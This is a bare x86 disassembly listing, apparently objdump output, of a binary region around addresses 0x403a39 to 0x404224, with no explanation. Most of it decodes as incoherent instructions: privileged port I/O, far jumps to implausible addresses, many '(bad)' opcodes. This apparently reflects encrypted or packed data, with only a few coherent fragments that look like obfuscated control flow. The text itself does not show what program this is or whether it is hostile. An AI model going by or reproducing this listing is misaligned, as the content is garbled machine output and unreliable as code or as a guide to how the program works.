  403a39:	add    eax,esi
  403a3b:	cmp    edx,eax
  403a3d:	jmp    0x403c0a
  403a42:	retf   
  403a43:	int3   
  403a44:	push   edi
  403a45:	push   0x6df17151
  403a4a:	mov    ch,0x57
  403a4c:	push   ebx
  403a4d:	mov    edi,0xbeb2e3a2
  403a52:	adc    dl,BYTE PTR [ecx]
  403a54:	jle    0x403ad4
  403a56:	scas   al,BYTE PTR es:[edi]
  403a57:	jg     0x403ad7
  403a59:	jle    0x403a66
  403a5b:	jns    0x403ad0
  403a5d:	fcomp  st(6)
  403a5f:	xchg   ebp,eax
  403a60:	sbb    cl,BYTE PTR [ebp+0xa97f92]
  403a66:	ret    0x8b7d
  403a69:	shl    DWORD PTR [ecx+0x3c],1
  403a6c:	fiadd  WORD PTR [edi-0x5c]
  403a6f:	add    DWORD PTR [bp+di+0x42],edi
  403a73:	aad    0x82
  403a75:	mov    ch,0x18
  403a77:	jnp    0x403a30
  403a79:	bnd jge 0x403a4c
  403a7c:	jns    0x403a0f
  403a7e:	mov    ds:0xee795d99,al
  403a83:	mov    eax,0xd55582a8
  403a88:	dec    esi
  403a89:	jo     0x403a4d
  403a8b:	ds adc eax,0xa1058b77
  403a91:	jnp    0x403ab3
  403a93:	test   eax,0x5d73ce7c
  403a98:	inc    esi
  403a99:	mov    edi,0xe3cba9a
  403a9e:	jno    0x403b1d
  403aa0:	scas   eax,DWORD PTR es:[edi]
  403aa1:	push   ecx
  403aa2:	cli    
  403aa3:	sahf   
  403aa4:	stos   BYTE PTR es:[edi],al
  403aa5:	jae    0x403b22
  403aa7:	add    eax,0x55415de5
  403aac:	data16 lahf 
  403aae:	or     al,0xb2
  403ab0:	cmc    
  403ab1:	hlt    
  403ab2:	xor    BYTE PTR [edi+0xf],dl
  403ab5:	sbb    esi,DWORD PTR [edx+esi*4]
  403ab8:	or     esp,DWORD PTR [edi-0x763f4ff6]
  403abe:	dec    ebx
  403abf:	js     0x403a4a
  403ac1:	dec    ebx
  403ac2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ac3:	xor    dl,ch
  403ac5:	jmp    0x403b25
  403ac7:	xlat   BYTE PTR ds:[ebx]
  403ac8:	mov    edi,DWORD PTR [esi-0x230aeec1]
  403ace:	retf   0x925b
  403ad1:	fcmovne st,st(5)
  403ad3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ad4:	xor    BYTE PTR fs:[edx+ebp*8],bh
  403ad8:	mov    DWORD PTR [ebp-0x47],esi
  403adb:	test   dh,bh
  403add:	jne    0x403a81
  403adf:	rcl    BYTE PTR [ebx+0x46ed497c],cl
  403ae5:	xor    al,0x34
  403ae7:	sub    al,0x97
  403ae9:	mov    dh,0xcb
  403aeb:	pop    ecx
  403aec:	test   al,0xdf
  403aee:	jmp    FWORD PTR [ecx]
  403af0:	fisub  WORD PTR [edx]
  403af2:	shl    DWORD PTR [ebx],cl
  403af4:	cmp    esi,ecx
  403af6:	add    eax,0x5718a76d
  403afb:	in     al,0xf1
  403afd:	add    eax,0x864ccf18
  403b02:	xchg   ecx,eax
  403b03:	and    bl,dl
  403b05:	pushf  
  403b06:	popa   
  403b07:	add    ebp,DWORD PTR [ebp-0x4f]
  403b0a:	xchg   ecx,eax
  403b0b:	xor    ebx,ebp
  403b0d:	mov    cl,0x54
  403b0f:	(bad)
  403b12:	jb     0x403b2d
  403b14:	push   0x35a1c10
  403b19:	mov    ecx,DWORD PTR [ebx-0x5d35e660]
  403b1f:	jg     0x403b96
  403b21:	daa    
  403b22:	pop    esi
  403b23:	or     BYTE PTR [edi],bl
  403b25:	mov    ds:0x183388ad,eax
  403b2a:	or     eax,0xce633654
  403b2f:	pop    es
  403b30:	push   cs
  403b31:	fistp  QWORD PTR [edi+ebp*4]
  403b34:	mov    ebx,0x45e4f2a5
  403b39:	add    al,0xc3
  403b3b:	xchg   ebx,eax
  403b3c:	and    al,0x83
  403b3e:	sbb    eax,0x71085e15
  403b43:	mov    DWORD PTR [esi+edx*1+0x52],edx
  403b47:	xor    edx,DWORD PTR [eax]
  403b49:	sbb    DWORD PTR [ebp-0x663a4fb],ebp
  403b4f:	outs   dx,BYTE PTR ds:[esi]
  403b50:	jle    0x403ba7
  403b52:	or     al,BYTE PTR ds:[ebx+0x2eb19247]
  403b59:	sahf   
  403b5a:	jmp    0xd578:0x91ac39d
  403b61:	scas   eax,DWORD PTR es:[edi]
  403b62:	icebp  
  403b63:	aaa    
  403b64:	mov    eax,0x44086411
  403b69:	adc    DWORD PTR [edi+0x66e8f2a7],eax
  403b6f:	jge    0x403b3c
  403b71:	push   cs
  403b72:	fadd   QWORD PTR gs:[esp+edi*4-0x3b23ae9c]
  403b7a:	xchg   ebx,eax
  403b7b:	call   0xe2907e9
  403b80:	inc    ecx
  403b81:	pop    ebx
  403b83:	cmp    ecx,DWORD PTR [ebx-0x7102c954]
  403b89:	mov    eax,ds:0xfd463860
  403b8e:	outs   dx,BYTE PTR ds:[esi]
  403b8f:	jne    0x403bbd
  403b91:	dec    esp
  403b92:	sub    eax,0xe62b5ba4
  403b97:	mov    ds:0xd79d414e,eax
  403b9c:	xchg   DWORD PTR [ebp-0x6b3d7b73],esp
  403ba2:	push   ebx
  403ba3:	cdq    
  403ba4:	jno    0x403b39
  403ba6:	pusha  
  403ba7:	aas    
  403ba8:	mov    dh,0x41
  403baa:	dec    esi
  403bab:	sbb    eax,0x1361803c
  403bb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403bb1:	jae    0x403b86
  403bb3:	out    dx,al
  403bb4:	sbb    al,ch
  403bb6:	adc    esi,DWORD PTR [ecx+0x37]
  403bb9:	push   esi
  403bba:	dec    esp
  403bbb:	ja     0x403c3b
  403bbd:	push   esi
  403bbe:	adc    al,0x64
  403bc0:	fst    DWORD PTR [esp+eax*2]
  403bc3:	inc    DWORD PTR [eax+0x35]
  403bc6:	test   BYTE PTR [edx+0x3ab33bc7],ch
  403bcc:	clc    
  403bcd:	test   DWORD PTR [edi],edx
  403bcf:	out    0xbb,eax
  403bd1:	in     eax,dx
  403bd2:	adc    DWORD PTR [ecx],eax
  403bd4:	mov    bh,dl
  403bd6:	sbb    ch,0x7a
  403bd9:	aam    0xef
  403bdb:	xchg   ecx,eax
  403bdc:	cdq    
  403bdd:	sub    BYTE PTR [esi],dl
  403bdf:	lahf   
  403be0:	neg    ebx
  403be2:	cmp    al,BYTE PTR [ebp+0x22]
  403be5:	jb     0x403be9
  403be7:	popf   
  403be8:	lock pop ds
  403bea:	aam    0xe9
  403bec:	add    al,0x91
  403bee:	test   al,0xc6
  403bf0:	pop    eax
  403bf1:	cmc    
  403bf2:	cmp    eax,0x1a010dc6
  403bf7:	or     al,0xf0
  403bf9:	fmul   st,st(7)
  403bfb:	jle    0x403b91
  403bfd:	jge    0x403c14
  403bff:	jmp    FWORD PTR [eax-0x1186579d]
  403c05:	mov    al,ds:0x3626f6f0
  403c0a:	je     0x4041a7
  403c10:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  403c17:	jmp    0x403de4
  403c1c:	scas   eax,DWORD PTR es:[edi]
  403c1d:	or     cl,BYTE PTR [edx]
  403c1f:	xor    eax,0x90b135ab
  403c24:	mov    esp,0x72dcf48b
  403c29:	in     eax,0xbf
  403c2b:	inc    esp
  403c2c:	inc    edx
  403c2d:	push   ds
  403c2e:	jle    0x403cae
  403c30:	scas   al,BYTE PTR es:[edi]
  403c31:	jg     0x403cb1
  403c33:	jle    0x403ca6
  403c35:	test   eax,0x8a26802d
  403c3a:	shl    DWORD PTR [edi-0x5c],0xe7
  403c3e:	mov    ds:0xe6d35c38,eax
  403c43:	icebp  
  403c44:	cmc    
  403c45:	in     eax,0xd1
  403c47:	cmp    ebp,0x70dfb8aa
  403c4d:	push   edx
  403c4e:	aaa    
  403c4f:	sar    DWORD PTR [esi+edi*2-0x49f2fdb5],0x21
  403c57:	fs test al,0x56
  403c5a:	pop    ecx
  403c5b:	pop    esi
  403c5c:	xor    cl,BYTE PTR [eax-0x15]
  403c5f:	sar    BYTE PTR [esi+0x259bf31f],0xf0
  403c66:	pop    es
  403c67:	sahf   
  403c68:	mov    ds:0xdc42054e,eax
  403c6d:	xchg   ecx,eax
  403c6e:	cmp    ch,BYTE PTR [esi-0x65]
  403c71:	cs popa 
  403c73:	js     0x403cbc
  403c75:	in     eax,0x58
  403c77:	dec    ebx
  403c78:	pop    ebp
  403c79:	and    eax,0x9320a2b9
  403c7e:	add    eax,0x92ea4d5a
  403c83:	out    dx,eax
  403c84:	jg     0x403c3a
  403c86:	sub    BYTE PTR [ecx+0x58],cl
  403c89:	out    dx,eax
  403c8a:	or     DWORD PTR [ebx],esp
  403c8c:	loop   0x403c8e
  403c8e:	fcomp  st(7)
  403c90:	(bad)  
  403c91:	mov    BYTE PTR [ecx],bl
  403c93:	xchg   esp,eax
  403c94:	stc    
  403c95:	jno    0x403d02
  403c97:	inc    ebx
  403c98:	ret    
  403c99:	inc    ebx
  403c9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c9b:	fidivr DWORD PTR [edi+ebp*1-0x80]
  403c9f:	add    BYTE PTR [ebp-0x19],ch
  403ca2:	sbb    eax,0x361505df
  403ca7:	das    
  403ca8:	xchg   ebx,eax
  403ca9:	push   esi
  403caa:	mov    cl,0xb3
  403cac:	push   0xffffffce
  403cae:	daa    
  403caf:	lahf   
  403cb0:	stos   DWORD PTR es:[edi],eax
  403cb1:	loop   0x403c90
  403cb3:	je     0x403c6d
  403cb5:	out    dx,eax
  403cb6:	test   BYTE PTR [edi],ah
  403cb8:	in     al,0x13
  403cba:	aad    0x38
  403cbc:	idiv   DWORD PTR [eax+0x62]
  403cbf:	shl    DWORD PTR [ebp+0x43],cl
  403cc2:	mov    ds:0x3f204350,al
  403cc7:	xchg   esi,eax
  403cc8:	xchg   ebx,eax
  403cc9:	ret    0x1bc4
  403ccc:	dec    edx
  403ccd:	fsub   st(0),st
  403ccf:	xor    al,0x6f
  403cd1:	jb     0x403cdc
  403cd3:	sahf   
  403cd4:	clc    
  403cd5:	sti    
  403cd6:	dec    edi
  403cd7:	mov    bh,0xea
  403cd9:	das    
  403cda:	inc    eax
  403cdb:	jne    0x403c75
  403cdd:	push   esi
  403cde:	ss je  0x403d58
  403ce1:	xchg   BYTE PTR ds:[eax-0x14],al
  403ce5:	inc    edi
  403ce6:	js     0x403c72
  403ce8:	or     al,dh
  403cea:	mov    al,0x2f
  403cec:	and    BYTE PTR [edx-0x1a],cl
  403cef:	push   0x6e2f6756
  403cf4:	std    
  403cf5:	cmp    eax,DWORD PTR [ebp+ebp*1+0x2b]
  403cf9:	jnp    0x403c82
  403cfb:	and    BYTE PTR [edx+0x1c90029a],dh
  403d01:	add    al,0x53
  403d03:	add    al,bl
  403d05:	ds add eax,0x7d8dc342
  403d0b:	shr    dh,cl
  403d0d:	push   ebp
  403d0e:	push   edx
  403d0f:	lods   al,BYTE PTR ds:[esi]
  403d10:	adc    eax,DWORD PTR gs:[eax+0x1aaf2261]
  403d17:	test   al,0xae
  403d19:	dec    edi
  403d1a:	fsubr  st,st(4)
  403d1c:	stos   DWORD PTR es:[edi],eax
  403d1d:	in     al,0x64
  403d1f:	adc    edi,ebx
  403d21:	inc    ecx
  403d22:	adc    eax,0xead47e35
  403d27:	cmc    
  403d28:	sbb    ch,BYTE PTR [ebx+ebp*4-0x343d080a]
  403d2f:	out    dx,eax
  403d30:	jecxz  0x403cd0
  403d32:	in     al,dx
  403d33:	or     esp,DWORD PTR [ebp+0x72624f59]
  403d39:	or     al,ch
  403d3b:	sub    ch,BYTE PTR ds:0x52fa494e
  403d41:	popf   
  403d42:	imul   ebx,DWORD PTR [ebp-0x3b],0xfffffffc
  403d46:	inc    BYTE PTR [edi+0x61ac213]
  403d4c:	rcl    cl,1
  403d4e:	gs cwde 
  403d50:	or     al,0xf0
  403d52:	mov    bh,bl
  403d54:	and    DWORD PTR [edx-0x23],esp
  403d57:	popf   
  403d58:	fist   WORD PTR [ebp+0x384baee9]
  403d5e:	sbb    al,0xb7
  403d60:	lock cld 
  403d62:	clc    
  403d63:	mov    dh,0xf5
  403d65:	out    dx,al
  403d66:	add    al,0xae
  403d68:	dec    ebp
  403d69:	mov    ah,0xa9
  403d6b:	fbstp  TBYTE PTR [edx+eax*1-0x75]
  403d6f:	aad    0x7d
  403d71:	jne    0x403cfd
  403d73:	sti    
  403d74:	hlt    
  403d75:	cdq    
  403d76:	sti    
  403d77:	mov    cl,0xe1
  403d79:	fidiv  DWORD PTR [edx-0x3e]
  403d7c:	push   eax
  403d7d:	adc    al,0x33
  403d80:	dec    ebp
  403d81:	fwait
  403d82:	nop
  403d83:	cmc    
  403d84:	das    
  403d85:	sahf   
  403d86:	fstp   QWORD PTR [eax-0x33]
  403d89:	or     eax,0x83fc5cd8
  403d8e:	sub    ebp,DWORD PTR [ecx-0x74]
  403d91:	icebp  
  403d92:	dec    edi
  403d93:	in     eax,0x31
  403d95:	xchg   ebp,eax
  403d96:	ror    DWORD PTR [eax],1
  403d98:	mov    edx,0x7c992d2c
  403d9d:	aad    0x4c
  403d9f:	sahf   
  403da0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403da1:	mov    ebp,0x73455b74
  403da6:	js     0x403dcd
  403da8:	gs ret 0x813
  403dac:	inc    edx
  403dad:	arpl   WORD PTR [esi+0x70],bp
  403db0:	push   esi
  403db1:	hlt    
  403db2:	popf   
  403db3:	shl    dh,0xb5
  403db6:	bnd jle 0x403df8
  403db9:	xor    al,BYTE PTR [edx+0x5c]
  403dbc:	shr    BYTE PTR [ecx-0x42],1
  403dbf:	ins    DWORD PTR es:[edi],dx
  403dc0:	rcr    BYTE PTR [eax-0x116674a5],cl
  403dc6:	in     eax,dx
  403dc7:	xor    ch,BYTE PTR [ebx+0x206a0fa]
  403dcd:	loope  0x403e4b
  403dcf:	xor    DWORD PTR [ecx+ebx*2+0x38],esp
  403dd3:	je     0x403df2
  403dd5:	call   0xa3d10c4c
  403dda:	or     al,BYTE PTR ds:0x872f6441
  403de0:	mov    al,ds:0x8db8c50c
  403de5:	inc    ebp
  403de6:	call   0x8c2c8374
  403deb:	inc    ebp
  403dec:	in     al,dx
  403ded:	add    DWORD PTR [eax],0x705fa8f
  403df3:	jmp    0x403fc0
  403df8:	mov    ebp,0xd441cc57
  403dfd:	inc    ecx
  403dfe:	push   ecx
  403dff:	push   ebx
  403e00:	jb     0x403dc4
  403e02:	and    DWORD PTR [edi+0x7df798d8],0x7e7e1cf2
  403e0c:	scas   al,BYTE PTR es:[edi]
  403e0d:	jg     0x403e8d
  403e0f:	jle    0x403dd1
  403e11:	stos   BYTE PTR es:[edi],al
  403e12:	fwait
  403e13:	inc    eax
  403e14:	out    0x88,al
  403e16:	leave  
  403e17:	dec    esp
  403e18:	adc    al,0x88
  403e1a:	xor    al,0xca
  403e1c:	xchg   DWORD PTR [ecx-0x24],edi
  403e1f:	mov    WORD PTR [edi+0x73296c13],es
  403e25:	int3   
  403e26:	mov    BYTE PTR [ecx+0x1f6fc50f],0x55
  403e2d:	sti    
  403e2e:	sbb    DWORD PTR [ebx-0x1c3e4ac5],0xffffffac
  403e35:	sub    BYTE PTR [ecx],bl
  403e37:	ins    DWORD PTR es:[edi],dx
  403e38:	inc    esp
  403e39:	es aam 0x52
  403e3c:	outs   dx,DWORD PTR ds:[esi]
  403e3d:	mov    ds:0x7e5b68fa,al
  403e42:	popf   
  403e43:	mov    DWORD PTR [edx],ebx
  403e45:	xchg   ebp,eax
  403e46:	inc    ebx
  403e47:	pop    ebx
  403e48:	mov    bl,0xee
  403e4a:	out    dx,eax
  403e4b:	add    dl,BYTE PTR [esi-0x25]
  403e4e:	add    DWORD PTR [ebx-0x23],edi
  403e51:	pop    esi
  403e52:	sbb    eax,0xfcd2be99
  403e57:	pushf  
  403e58:	push   edx
  403e59:	jmp    0x403ebc
  403e5b:	push   es
  403e5c:	xchg   ebp,eax
  403e5d:	shr    DWORD PTR [ecx+0x6b52d128],cl
  403e63:	lock sub DWORD PTR cs:[eax+0x2018add6],esp
  403e6b:	push   ds
  403e6c:	test   al,0xff
  403e6e:	mov    edx,0x51a04701
  403e73:	arpl   WORD PTR [ebx+edx*8],bp
  403e76:	out    dx,eax
  403e77:	and    DWORD PTR [ecx+0x40],ebx
  403e7a:	(bad)  
  403e7b:	fidiv  WORD PTR [ebx-0x13ce1ce1]
  403e81:	pop    ecx
  403e82:	shr    DWORD PTR [edx-0x21],1
  403e85:	xchg   BYTE PTR [eax-0x5078983e],cl
  403e8b:	sub    al,0xaa
  403e8d:	pushf  
  403e8e:	int3   
  403e8f:	jmp    0xcf7c:0xe576ac7c
  403e96:	retf   
  403e97:	(bad)  
  403e98:	mov    al,ds:0x4d7ad6e9
  403e9d:	pop    eax
  403e9e:	(bad)  
  403e9f:	push   es
  403ea0:	pop    edx
  403ea1:	xchg   ecx,eax
  403ea2:	(bad)  
  403ea3:	dec    edx
  403ea4:	mov    ds:0xdaff8bd0,al
  403ea9:	xchg   esp,eax
  403eaa:	mov    ch,0xa8
  403eac:	adc    DWORD PTR ds:0xe47a5902,esp
  403eb2:	lods   eax,DWORD PTR ds:[esi]
  403eb3:	xchg   ebp,eax
  403eb4:	inc    ebx
  403eb5:	sar    DWORD PTR [eax-0x2d344393],0x81
  403ebc:	test   al,0xcd
  403ebe:	sbb    al,BYTE PTR [ebx]
  403ec0:	out    0x47,eax
  403ec2:	rcr    ah,cl
  403ec4:	fdivr  QWORD PTR [ecx+0x39d7f405]
  403eca:	fsubrp st(2),st
  403ecc:	mov    bh,0x4e
  403ece:	sbb    al,BYTE PTR [ebp-0x37de4f9d]
  403ed4:	xchg   BYTE PTR [eax-0x6d3a35ce],ch
  403eda:	not    BYTE PTR [ebp+0x3cff1068]
  403ee0:	inc    eax
  403ee1:	or     BYTE PTR [ecx+esi*2-0x51],0x2c
  403ee6:	test   eax,0x26d1d1df
  403eeb:	add    al,0x39
  403eed:	jle    0x403f08
  403eef:	fsubr  QWORD PTR [ebp+0x2ecb8868]
  403ef5:	jle    0x403ed6
  403ef7:	outs   dx,BYTE PTR ds:[esi]
  403ef8:	sbb    BYTE PTR [ecx+0x76],dl
  403efb:	pop    esi
  403efc:	es stos DWORD PTR es:[edi],eax
  403efe:	iret   
  403eff:	aad    0x63
  403f01:	push   ds
  403f02:	jl     0x403ec8
  403f04:	retf   0x214b
  403f07:	lea    esi,[ecx]
  403f09:	loopne 0x403ed0
  403f0b:	cmp    BYTE PTR [eax-0x6ddbd709],bl
  403f11:	xchg   esp,eax
  403f12:	lea    ecx,[edi+0x5935a0d8]
  403f18:	dec    esi
  403f19:	xchg   edx,eax
  403f1a:	sti    
  403f1b:	cmp    BYTE PTR [ecx+0x6a2eb509],0xde
  403f22:	hlt    
  403f23:	sbb    al,0x18
  403f25:	adc    ebp,DWORD PTR [esi-0x2e997267]
  403f2b:	xor    eax,0x77731093
  403f30:	bound  ebx,QWORD PTR [ecx-0x77]
  403f33:	fist   DWORD PTR [ebx+0x0]
  403f36:	enter  0xdeb5,0x7e
  403f3a:	icebp  
  403f3b:	aam    0xec
  403f3d:	jp     0x403f82
  403f3f:	push   edi
  403f40:	mov    ds:0xf3ec12e5,eax
  403f45:	ja     0x403f49
  403f47:	and    edx,DWORD PTR [edx+0x5a]
  403f4a:	lock xchg ebp,eax
  403f4c:	mov    dh,0x6e
  403f4e:	inc    ecx
  403f4f:	or     al,0x61
  403f51:	push   edi
  403f52:	fistp  WORD PTR [ecx-0x1378f057]
  403f58:	call   0xebfb7914
  403f5d:	push   ebp
  403f5e:	jmp    0x3a0b408c
  403f63:	adc    eax,0x2432702e
  403f68:	push   ecx
  403f69:	sub    al,0x4d
  403f6b:	sbb    al,0xa9
  403f6d:	mov    ecx,0xec8e7b50
  403f72:	or     BYTE PTR [ebp-0x5260ff11],0x39
  403f79:	ss pop ss
  403f7b:	push   ecx
  403f7c:	cs push eax
  403f7e:	std    
  403f7f:	daa    
  403f80:	dec    ebp
  403f81:	push   esi
  403f82:	fwait
  403f83:	lea    ecx,[esi]
  403f85:	jne    0x403f59
  403f87:	daa    
  403f88:	xor    al,0xfa
  403f8a:	call   0x78d3:0x726a50f9
  403f91:	sti    
  403f92:	push   ds
  403f93:	mov    esp,0x9ed03709
  403f98:	xchg   BYTE PTR [ebx+edx*1-0x5f],al
  403f9c:	in     eax,dx
  403f9d:	jns    0x403fab
  403f9f:	clc    
  403fa0:	push   eax
  403fa1:	aam    0x1a
  403fa3:	in     al,dx
  403fa4:	addr16 jo 0x403fbc
  403fa7:	pop    ss
  403fa8:	mov    eax,ds:0x7805fec4
  403fad:	jno    0x403f73
  403faf:	adc    eax,0x9d77860e
  403fb4:	int    0x8
  403fb6:	aad    0x9d
  403fb8:	test   BYTE PTR [edx+0x11ea92fc],dl
  403fbe:	cmp    al,0x3d
  403fc0:	mov    eax,DWORD PTR [ebp-0x10]
  403fc3:	mov    edx,DWORD PTR [ebp+0x8]
  403fc6:	xor    eax,ecx
  403fc8:	jmp    0x404195
  403fcd:	pop    edi
  403fce:	sub    al,0x9f
  403fd0:	dec    edx
  403fd1:	ins    DWORD PTR es:[edi],dx
  403fd2:	dec    ecx
  403fd3:	imul   ebp,DWORD PTR [ecx],0x54
  403fd6:	and    dl,0x1
  403fd9:	mov    edx,0x2239e9a8
  403fde:	sbb    bh,BYTE PTR [esi+0x7e]
  403fe1:	scas   al,BYTE PTR es:[edi]
  403fe2:	jg     0x404062
  403fe4:	jle    0x403f7b
  403fe6:	jno    0x404000
  403fe8:	imul   esi,ebx,0xaa6d2b96
  403fee:	add    BYTE PTR [eax-0x171edbd6],bl
  403ff4:	add    ecx,DWORD PTR [ebx*4-0x3d38e62d]
  403ffb:	mov    ch,0x5a
  403ffd:	mov    ecx,0x55c055ef
  404002:	int    0x81
  404004:	sbb    eax,0x51fad04e
  404009:	lock fist WORD PTR [esi-0x2c]
  40400d:	add    esp,DWORD PTR [eax+0x42c14706]
  404013:	ja     0x403f9f
  404015:	rcl    DWORD PTR fs:[eax-0x1e321a69],0xba
  40401d:	jmp    0xdb5ed5c5
  404022:	cmp    cl,dl
  404024:	cmc    
  404025:	mov    ebx,0x8e71fe66
  40402a:	icebp  
  40402b:	icebp  
  40402c:	jno    0x404047
  40402e:	int    0x56
  404030:	adc    eax,0xab820fe
  404035:	mov    eax,esp
  404037:	xor    dh,BYTE PTR [eax+0x19]
  40403a:	and    eax,0x3dfb816
  40403f:	xchg   esi,eax
  404040:	push   edi
  404041:	jne    0x40408c
  404043:	fimul  DWORD PTR [ebp+0x61886252]
  404049:	adc    bh,BYTE PTR ds:0x78c69d97
  40404f:	ss mov ah,0xdc
  404052:	aad    0x98
  404054:	clc    
  404055:	mov    esp,0xff3e7933
  40405a:	fist   WORD PTR [ebp+0x21]
  40405d:	fld    TBYTE PTR [edx+0x68381341]
  404063:	xchg   esp,eax
  404064:	inc    ebx
  404065:	adc    DWORD PTR [ecx-0x8e114a1],ecx
  40406b:	xchg   edx,eax
  40406c:	cmp    BYTE PTR [ecx-0x3],dh
  40406f:	sub    DWORD PTR [esi-0x10],0xfffffffe
  404073:	(bad)  
  404074:	loopne 0x404003
  404076:	fbstp  TBYTE PTR [edx+ecx*4-0x57]
  40407a:	mov    ebx,0xdc4e744d
  40407f:	data16 test BYTE PTR [ebx-0x67],0x4
  404084:	sbb    DWORD PTR [esi+0x4b],esi
  404087:	fisttp DWORD PTR [eax+0x5e]
  40408a:	into   
  40408b:	or     edx,eax
  40408d:	out    0x91,eax
  40408f:	lahf   
  404090:	cmp    al,0x28
  404092:	adc    BYTE PTR [esi+eiz*1],cl
  404095:	or     ch,BYTE PTR [eax+0x52]
  404098:	or     BYTE PTR [esi],bl
  40409a:	ror    BYTE PTR [esi-0x4e5e2abd],1
  4040a0:	jno    0x404095
  4040a2:	das    
  4040a3:	mov    ecx,0x7a873749
  4040a8:	or     ah,cl
  4040aa:	mov    dl,0x1e
  4040ac:	scas   eax,DWORD PTR es:[edi]
  4040ad:	pushf  
  4040ae:	fld    TBYTE PTR [ebp+0x34]
  4040b1:	push   esp
  4040b2:	and    DWORD PTR [edx],esp
  4040b4:	xor    BYTE PTR [ebx+0x29],0xa8
  4040b8:	inc    ebx
  4040b9:	push   es
  4040ba:	ror    edi,0x6a
  4040bd:	jg     0x4040fe
  4040bf:	jmp    0x1ab72b7e
  4040c4:	icebp  
  4040c5:	add    edi,esi
  4040c7:	inc    esi
  4040c8:	xchg   edi,esi
  4040ca:	sbb    esp,DWORD PTR [esi-0x2f]
  4040cd:	jp     0x404133
  4040cf:	push   ecx
  4040d0:	rol    edi,1
  4040d2:	ins    DWORD PTR es:[edi],dx
  4040d3:	aaa    
  4040d4:	(bad)  
  4040d5:	cmc    
  4040d6:	aas    
  4040d7:	sbb    eax,0x29b6f325
  4040dc:	cld    
  4040dd:	cmp    al,0x61
  4040df:	cs stos DWORD PTR es:[edi],eax
  4040e1:	sub    DWORD PTR [edi+0x1a],ebx
  4040e4:	jo     0x4040ab
  4040e6:	into   
  4040e7:	push   edi
  4040e8:	xor    cl,BYTE PTR [ebx-0x33029c9e]
  4040ee:	add    bl,ch
  4040f0:	cli    
  4040f1:	sbb    eax,0xc06d307b
  4040f6:	rcr    DWORD PTR [ecx+0x160cd9bf],1
  4040fc:	sub    DWORD PTR gs:[eax],edi
  4040ff:	add    eax,0x72c39a8a
  404104:	arpl   WORD PTR [ebx-0x9537435],dx
  40410a:	jnp    0x40414e
  40410c:	sbb    ch,BYTE PTR [ebx-0x3a]
  40410f:	dec    esi
  404110:	dec    ebp
  404111:	ficom  WORD PTR [ecx]
  404113:	mov    dl,BYTE PTR [ebp+0x6c846400]
  404119:	mov    al,ds:0x5f6a3516
  40411e:	and    eax,0xd121feaa
  404123:	push   es
  404124:	jge    0x4040d7
  404126:	(bad)  
  404127:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404128:	mov    ebx,0x7e8cf56f
  40412d:	ret    0x8d79
  404130:	cmp    al,bl
  404132:	adc    BYTE PTR [ecx-0x4b],0x1b
  404136:	aas    
  404137:	add    DWORD PTR [esi+edi*1],0xfffffff2
  40413b:	mov    eax,ds:0xf7198e48
  404140:	mov    dh,0x43
  404142:	rcl    DWORD PTR [edx+0x174e5a79],cl
  404148:	mov    ds:0x44a3398d,eax
  40414d:	dec    ebp
  40414e:	lds    edi,FWORD PTR [ecx]
  404150:	add    al,0x49
  404152:	dec    esp
  404153:	gs in  eax,0xda
  404156:	lds    eax,FWORD PTR [edx+0x3d]
  404159:	test   eax,0x9afdebe3
  40415e:	and    eax,0xd2b1b22d
  404163:	std    
  404164:	add    esi,DWORD PTR [ebx]
  404166:	jbe    0x40419c
  404168:	xchg   esp,eax
  404169:	dec    esi
  40416a:	scas   al,BYTE PTR es:[edi]
  40416b:	mov    WORD PTR [ebx-0x4d],es
  40416e:	xor    bh,cl
  404170:	push   es
  404171:	pushf  
  404172:	mov    cl,0x54
  404174:	mov    ecx,0x3fe6787c
  404179:	outs   dx,DWORD PTR ds:[esi]
  40417a:	add    al,dh
  40417c:	sti    
  40417d:	(bad)  
  40417e:	jle    0x404145
  404180:	pop    es
  404181:	pop    eax
  404182:	pop    edx
  404183:	stos   DWORD PTR es:[edi],eax
  404184:	jns    0x4041a6
  404186:	mov    ah,0xaa
  404188:	mov    ebp,0x6909ee4c
  40418d:	sbb    al,0xaa
  40418f:	lock pop ds
  404191:	mov    ebx,0x8dcbc440
  404196:	test   BYTE PTR [eax],dl
  404198:	fwait
  404199:	jb     0x4041cd
  40419b:	add    BYTE PTR [ecx+0x45ff0845],cl
  4041a1:	or     al,0xe9
  4041a3:	arpl   ax,di
  4041a5:	(bad)  
  4041a6:	dec    DWORD PTR [ebx-0x3ecc0fbb]
  4041ac:	mov    ecx,DWORD PTR [ebp+0x10]
  4041af:	add    eax,esi
  4041b1:	mov    DWORD PTR [ecx],eax
  4041b3:	pop    esi
  4041b4:	leave  
  4041b5:	ret    0xc
  4041b8:	push   ebp
  4041b9:	mov    ebp,esp
  4041bb:	push   ecx
  4041bc:	push   ecx
  4041bd:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  4041c4:	jmp    0x404388
  4041c9:	call   0xb2b3:0xa7939f83
  4041d0:	mov    bl,0x67
  4041d2:	ja     0x4041f1
  4041d4:	pop    esp
  4041d5:	mov    ebx,DWORD PTR [esi+0x65]
  4041d8:	fist   DWORD PTR [edx+0x1b]
  4041db:	jle    0x40425b
  4041dd:	cdq    
  4041de:	jg     0x40425e
  4041e0:	jle    0x40425d
  4041e2:	pop    esi
  4041e3:	call   0x99d15413
  4041e8:	xor    al,0x29
  4041ea:	push   ds
  4041eb:	dec    edi
  4041ec:	(bad)  
  4041ee:	add    al,0xc4
  4041f0:	push   ebp
  4041f1:	(bad)  
  4041f2:	bound  esi,QWORD PTR [edx-0x60678dc7]
  4041f8:	repnz mov dh,0xb9
  4041fb:	pop    ecx
  4041fc:	sbb    DWORD PTR [edi],ebp
  4041fe:	sbb    cl,BYTE PTR [edi+0x38]
  404201:	and    eax,esp
  404203:	mov    bl,0x15
  404205:	push   ebp
  404206:	into   
  404207:	nop
  404208:	outs   dx,BYTE PTR ds:[esi]
  404209:	mov    ah,0xc0
  40420b:	stc    
  40420c:	pop    es
  40420d:	call   0x78d399ca
  404212:	not    dl
  404214:	ret    
  404215:	mov    ds:0xfa6b22fd,al
  40421a:	sbb    BYTE PTR [esi-0x35],bl
  40421d:	imul   ecx,DWORD PTR [edx+0x210bbb0f],0xfffffffa
  404224:	jno    0x4041f8
